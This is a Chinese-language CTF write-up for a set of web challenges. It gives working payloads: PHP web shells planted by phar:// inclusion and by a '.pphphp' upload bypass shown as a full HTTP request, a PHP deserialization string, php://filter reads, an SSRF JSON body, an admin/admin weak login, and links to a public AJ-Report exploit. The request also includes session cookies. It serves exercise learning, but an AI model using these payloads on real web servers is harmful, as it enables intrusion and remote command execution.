## LEAK
使用 githacker 获取源码。
```
githacker
```
再进入到源码文件夹，使用 git ，显示特定的 ID，获取 flag。
```
git show
```
## Pentest ez_莆田
找到网上公开的 exp。
```
https://www.cnblogs.com/Rainy-Day/p/18220776
```

```
https://github.com/yuebusao/AJ-REPORT-EXPLOIT
```

最后结合以上两篇文章，将 github 上的脚本中的 `'whoami'` 改为以下这个：
```
'/bin/sh', '-c', 'cat${IFS}/flag.txt'
```
## babyjs
F12 进入终端，修改分数。
```
score = 1145141919810;
 ```
 然后控分，获得 flag。
## environment1nfo
利用 A 类和 B 类，本地先运行以下代码。
```php
<?php
$b = new B();
$b->a = new A();
$b->a->a = new Flag();
$b->p = 'foo';
var_dump($b);
$payload = serialize($b);
var_dump($payload);
```
最终获得以下这个字符串，然后选择 get 传参。
`O:1:"B":2:{s:1:"a";O:1:"A":1:{s:1:"a";O:4:"Flag":0:{}}s:1:"p";s:3:"foo";}`
## ez_include
直接伪协议。
```
php://filter/read=convert.base64-encode/resource=flag.php
```
## medium_include
这里需要用到 `phar://` 协议，来满足最后为 `.txt` 的条件。

先在 `1.txt` 中写入以下 php 代码。
```1.txt
<?php system($_GET['cmd']);?>
```

接着将其压缩。
```
1.zip
  - 1.txt
```

压缩后改文件名。
```
1.zip -> 1.html
```

然后用伪协议
```
phar://uploads/...html#1.txt?cmd=ls
```
## proxy
阅读代码可得，需要构造一个下面的 JSON 格式的数据，然后访问 `/proxy` ，根据路由规则，访问到 `/flag`。
```json
{
    "url" : "http://127.0.0.1/flag",
    "method" : "POST", 
    "body" : "/flag"
}
```

## \[Spring\]Pentest 1
根据提示，在网上搜索公开 exp
```
https://github.com/yuebusao/AJ-REPORT-EXPLOIT
```

RCE 的位置。
http://ctf.certstone.top:58080/tomcatwar.jsp?pwd=j&cmd=pwd

然后在根目录下找到 `/flag`，`cat` 之。
## 睡美人
发现过滤了很多与代码执行相关的函数，但是没有过滤 `include()`。那么就猜服务器根目录有个 `/flag`，然后猜对了。
```
action=include("/flag")
```
## 客服小祥
弱口令
```
admin
admin
```

登入后台，发现文件上传点。

尝试上传图片马，但是并没有办法解析。

发现上传的加了图片头的 `.php` 文件，通过了后端检测，但是后缀名被改。于是抓包，尝试绕过后缀名检测。

最后是以 `.pphphp` 的形式绕过后端的后缀名检测。然后根据提供的目录，访问到解析过 php 文件，通过 RCE 拿到 flag。

payload:
```http
POST /playground.php HTTP/1.1
Host: ctf.certstone.top:33011
Content-Length: 417
Cache-Control: max-age=0
Origin: http://ctf.certstone.top:33011
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryobuexeEvPw0cBCqw
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://ctf.certstone.top:33011/playground.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: _tea_utm_cache_10000007=undefined; _ga=GA1.2.1330981132.1731064387; _ga_E1GTYFL925=GS1.2.1731114759.3.1.1731115908.0.0.0; PHPSESSID=fb4cbfb742372ba1ab27f0c1c0b05138; JSESSIONID=D1D12E726D1FFBB32648C71558C91D27; GZCTF_Token=CfDJ8HOBFo_TAOdLmQfv0-Qj17OpB8qM2xxrEh5ns4m_BVlzM4xcnRMv8yGMuXGMD7j09hUZ6jnokYVkOyh94byGSBbzkOUF8HH04jCZ9hskf1r1Dx36rGB5XRBBz8hn1akGThyOiE4FOiHqQruSxQ4FEPCzCt6agw_ZP0n4mjRqPmctgHMJNL-aRa9vRtvVCcAAUiAbQgleReUFbc8Aom4oSSEzr9ogc3BzebHO2HJMZreJj_zxwJAgiJT1ouYEFkPonguY55qHhNMbhdQJEMA_jro_dqolJoX-Ve6PpCrMttlTKD-vT-ae4CICNdOuISiKyab8gczyykmqyZFxHJuEnUZnwE_F6wnE7Ekp6A1x84u06b00t1mgNnfABy1Ju16fZVgro8Mp-st_5k0zGV_EYDVL3t0rXQ5BhdfalTWWLyO01kWmcoYQBxihAwjJtLPl29tNMKTg8hcMluttFCebsuJnG0DmINsmLnO7yET6zqe4ccoZI_F2jiw-qvAfNxoS28iq8nr8AwvvTYaTTWHRYI8PZ1u-xpIA0LGJNSWhVE5gjTP4frgBtWFwl9vbnsgg-pMKvw23ljrQ9zZVcFyoLd4g2O5c9KMS8Ihs-DxpM1ATnzRF2Z-1v41btw44HVWoC-gCaBSyD3XLW-4RLLXVgROsMu80qLQXz-0bpmKwcwHWndhKy9WDSygBQ6TduLRoZciMHoGMYFTH94rcRqF2wRw3KYSB_f-cJA-I7M8XaIjF
Connection: keep-alive

------WebKitFormBoundaryobuexeEvPw0cBCqw
Content-Disposition: form-data; name="complaintText"

aaa
------WebKitFormBoundaryobuexeEvPw0cBCqw
Content-Disposition: form-data; name="attachment"; filename="1.pphphp"
Content-Type: php

ÿØ<?php system($_GET['cmd']);?>
------WebKitFormBoundaryobuexeEvPw0cBCqw
Content-Disposition: form-data; name="action"

complaint
------WebKitFormBoundaryobuexeEvPw0cBCqw--

```